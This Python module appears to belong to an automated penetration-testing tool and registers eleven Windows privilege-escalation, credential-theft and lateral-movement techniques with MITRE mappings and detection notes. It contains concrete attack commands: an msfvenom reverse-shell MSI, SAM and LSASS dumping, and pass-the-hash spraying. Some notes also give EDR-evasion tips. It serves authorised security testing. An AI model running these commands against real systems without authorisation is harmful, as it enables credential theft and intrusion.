"""
methodologies/windows.py — Windows-specific attack methodologies.

11 entries covering Windows privilege escalation, credential extraction,
lateral movement, and Active Directory attacks.

Registered with os_tags=["windows"].
"""

from wan_shi_tong.registry import MethodologyRegistry
from wan_shi_tong.schema import Methodology

_R = MethodologyRegistry.get()

_R.register(Methodology(
    id="wsit_win_token_impersonate",
    name="Token Impersonation (Potato Family)",
    category="privilege_esc",
    phase="predicting",
    triggers=["os:windows", "post_auth_data:seimpersonate"],
    mitre=["T1134.001"],
    prerequisites=["windows_shell_access", "SeImpersonatePrivilege"],
    tools=["JuicyPotato", "PrintSpoofer", "GodPotato", "SweetPotato"],
    description=(
        "If the current process has SeImpersonatePrivilege (common for IIS app pools, "
        "SQL Server service accounts, and any low-priv service account), a Potato "
        "exploit can impersonate the SYSTEM token. "
        "PrintSpoofer and GodPotato work on modern Windows (2019+, 10/11). "
        "JuicyPotato requires CLSID selection but works on older systems. "
        "Result: SYSTEM-level command execution."
    ),
    opsec_level=2,
    expected_findings=["issue"],
    next_ids=[],
    detection_notes="Token manipulation logged: Event ID 4672 (special privileges assigned). "
                    "Potato binaries caught by most AV/EDR — use reflective loading.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_unquoted_svc",
    name="Unquoted Service Path Abuse",
    category="privilege_esc",
    phase="predicting",
    triggers=["os:windows", "post_auth_data:services"],
    mitre=["T1574.009"],
    prerequisites=["windows_shell_access"],
    tools=["sc", "wmic", "accesschk"],
    description=(
        "Enumerate services with unquoted paths containing spaces: "
        "wmic service get name,pathname | findstr /i /v 'C:\\Windows'. "
        "If the path is C:\\Program Files\\Vendor\\Service\\service.exe, "
        "Windows tries C:\\Program.exe first — place a binary there if writable. "
        "Service must run as SYSTEM or a high-privilege account to be useful. "
        "Requires restart of the service or reboot to trigger."
    ),
    opsec_level=3,
    expected_findings=["issue"],
    next_ids=[],
    detection_notes="Service modification logged: Event ID 7045 (new service), 4697 (service installed). "
                    "Binary placement in Program Files requires write access.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_dpapi_extract",
    name="DPAPI Credential Blob Extraction",
    category="credential",
    phase="predicting",
    triggers=["os:windows", "finding:cred", "post_auth_data:*"],
    mitre=["T1555.004"],
    prerequisites=["windows_user_access"],
    tools=["mimikatz", "SharpDPAPI", "pypykatz"],
    description=(
        "Windows DPAPI protects saved credentials (browser passwords, RDP credentials, "
        "Wi-Fi passwords, Outlook profiles). User masterkeys are decryptable with the "
        "user's password or NTLM hash. SharpDPAPI --triage dumps all DPAPI blobs and "
        "decrypts with known credentials. Browser credential stores "
        "(Chrome Login Data, Edge) are DPAPI-encrypted and high-value."
    ),
    opsec_level=4,
    expected_findings=["cred"],
    next_ids=["wsit_cred_reuse"],
    detection_notes="DPAPI key access logged if auditing configured; "
                    "SharpDPAPI detected by most modern EDR.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_sam_dump",
    name="SAM / SYSTEM Hive Dump",
    category="credential",
    phase="predicting",
    triggers=["os:windows", "post_auth_data:admin_access"],
    mitre=["T1003.002"],
    prerequisites=["windows_admin_access"],
    tools=["impacket-secretsdump", "mimikatz", "reg.exe"],
    description=(
        "Dump local account NTLM hashes from the SAM hive + SYSTEM key. "
        "Methods: reg save HKLM\\SAM + HKLM\\SYSTEM to disk (requires admin), "
        "or impacket secretsdump -sam/-system against local/remote target. "
        "Extracted NTLMs enable Pass-the-Hash without cracking. "
        "Domain-joined machines: dump LSA secrets for cached domain credentials."
    ),
    opsec_level=2,
    expected_findings=["cred"],
    next_ids=["wsit_win_pth"],
    detection_notes="reg.exe saves logged: Event ID 4663 (object access). "
                    "Impacket secretsdump creates a service remotely: Event ID 7045.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_pth",
    name="Pass-the-Hash (CrackMapExec / Impacket)",
    category="lateral",
    phase="predicting",
    triggers=["os:windows", "finding:cred", "port:445"],
    mitre=["T1550.002"],
    prerequisites=["ntlm_hash_obtained", "port:445"],
    tools=["crackmapexec", "impacket-psexec", "impacket-wmiexec"],
    description=(
        "Authenticate to Windows services using NTLM hashes without cracking. "
        "crackmapexec smb <subnet> -u admin -H <hash> --local-auth sprays across hosts. "
        "psexec.py / wmiexec.py provide interactive shells via hash. "
        "Works against SMB, WinRM, MSSQL, RDP (with RDP PTH mode), and LDAP. "
        "Enables lateral movement to any host where the hash is valid."
    ),
    opsec_level=1,
    expected_findings=["cred"],
    next_ids=["wsit_smb_filehunt"],
    detection_notes="NTLM authentication with hash: Event ID 4624 logon type 3. "
                    "Impacket tools use distinct service names — Defender detects.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_winrm_session",
    name="WinRM Remote Session (Evil-WinRM)",
    category="post_exploit",
    phase="looking_deeper",
    triggers=["os:windows", "port:5985", "finding:cred"],
    mitre=["T1021.006"],
    prerequisites=["port:5985_or_5986", "winrm_cred_or_hash"],
    tools=["evil-winrm", "impacket-winrm"],
    description=(
        "WinRM (HTTP 5985, HTTPS 5986) provides remote PowerShell sessions. "
        "Evil-WinRM supports password, hash, and certificate authentication. "
        "Built-in file upload/download, in-memory loading of .Net assemblies, "
        "and PowerShell script execution. "
        "Winrm is enabled by default on Windows Server 2012+ in DC/server roles."
    ),
    opsec_level=2,
    expected_findings=["post_auth_data"],
    next_ids=["wsit_win_sam_dump", "wsit_win_lsass_dump"],
    detection_notes="WinRM connections logged: Event ID 169 (WSMan), 4624 (logon type 3). "
                    "Evil-WinRM traffic pattern detectable by network NDR.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_reg_autologon",
    name="Registry AutoLogon Credential Extraction",
    category="credential",
    phase="predicting",
    triggers=["os:windows", "post_auth_data:registry"],
    mitre=["T1552.002"],
    prerequisites=["windows_shell_access"],
    tools=["reg.exe", "crackmapexec", "metasploit"],
    description=(
        "Query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon "
        "for AutoAdminLogon, DefaultUserName, DefaultPassword. "
        "Used on kiosk and embedded Windows systems for automatic login. "
        "Credentials stored in cleartext. "
        "Also check: DefaultDomainName for domain context, "
        "and HKLM\\SYSTEM\\CurrentControlSet\\Services for service account credentials."
    ),
    opsec_level=5,
    expected_findings=["cred"],
    next_ids=["wsit_cred_reuse"],
    detection_notes="Registry reads are largely unlogged unless specific key auditing is configured.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_alwaysinstall",
    name="AlwaysInstallElevated MSI Abuse",
    category="privilege_esc",
    phase="predicting",
    triggers=["os:windows", "post_auth_data:alwaysinstall"],
    mitre=["T1548.002"],
    prerequisites=["windows_shell_access", "alwaysinstallelevated_enabled"],
    tools=["msfvenom", "msitools"],
    description=(
        "If both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1, "
        "any user can install MSI packages as SYSTEM. "
        "Generate a malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp "
        "-f msi > payload.msi. Execute: msiexec /quiet /qn /i payload.msi. "
        "MSI executes as SYSTEM regardless of the calling user's privilege level."
    ),
    opsec_level=2,
    expected_findings=["issue"],
    next_ids=[],
    detection_notes="msiexec with elevated privileges logged: Event ID 1040/1042 in Application log. "
                    "Most modern AV detects msfvenom MSI payloads.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_scheduled_tasks",
    name="Scheduled Task Hijack",
    category="persistence",
    phase="predicting",
    triggers=["os:windows", "post_auth_data:tasks"],
    mitre=["T1053.005"],
    prerequisites=["windows_shell_access"],
    tools=["schtasks", "taskschd.msc", "accesschk"],
    description=(
        "Enumerate scheduled tasks running as SYSTEM or high-privilege accounts. "
        "schtasks /query /fo LIST /v reveals all tasks, run-as context, and executable paths. "
        "Look for: tasks executing writable scripts/binaries, tasks with missing executables, "
        "or tasks in writable directories. "
        "Modify the executable or create the missing binary to hijack execution context."
    ),
    opsec_level=3,
    expected_findings=["issue"],
    next_ids=[],
    detection_notes="Task creation/modification: Event ID 4698, 4702. "
                    "Modified binaries may trigger file integrity monitoring.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_lsass_dump",
    name="LSASS Memory Dump (Credential Extraction)",
    category="credential",
    phase="predicting",
    triggers=["os:windows", "post_auth_data:admin_access"],
    mitre=["T1003.001"],
    prerequisites=["windows_admin_access", "SeDebugPrivilege"],
    tools=["mimikatz", "pypykatz", "procdump", "comsvcs.dll"],
    description=(
        "Dump LSASS process memory to extract plaintext credentials, NTLM hashes, "
        "Kerberos tickets, and DPAPI masterkeys for all users with active sessions. "
        "Methods: comsvcs.dll MiniDump (LOLbin, less detectable), "
        "procdump -ma lsass.exe, or Mimikatz sekurlsa::logonpasswords. "
        "Requires SeDebugPrivilege (local admin). Windows Credential Guard blocks "
        "plaintext extraction but not NTLM hashes."
    ),
    opsec_level=1,
    expected_findings=["cred"],
    next_ids=["wsit_win_pth", "wsit_cred_reuse"],
    detection_notes="LSASS access: Event ID 10 (Sysmon), 4656/4663 (object access). "
                    "Extremely high-confidence EDR detection — use obfuscated tools or "
                    "memory-only techniques.",
), os_tags=["windows"])

_R.register(Methodology(
    id="wsit_win_kerberoast",
    name="Kerberoasting (SPN Account Attack)",
    category="credential",
    phase="predicting",
    triggers=["os:windows", "service:kerberos", "port:88", "issue:domain"],
    mitre=["T1558.003"],
    prerequisites=["domain_user_access", "port:88"],
    tools=["impacket-GetUserSPNs", "rubeus", "hashcat"],
    description=(
        "Request Kerberos TGS tickets for service accounts with SPNs registered. "
        "Any domain user can request TGS tickets. The tickets are encrypted with "
        "the service account's NTLM hash — offline cracking with hashcat mode 13100. "
        "High-value targets: SQL service accounts (MSSQLSvc), web app pools, "
        "and any service account with Domain Admin membership. "
        "impacket-GetUserSPNs -request dumps all crackable tickets in one command."
    ),
    opsec_level=3,
    expected_findings=["cred"],
    next_ids=["wsit_lin_hash_crack"],
    detection_notes="TGS requests logged: Event ID 4769. "
                    "High volume of 4769 events triggers ATA/Defender Identity alerts.",
), os_tags=["windows"])
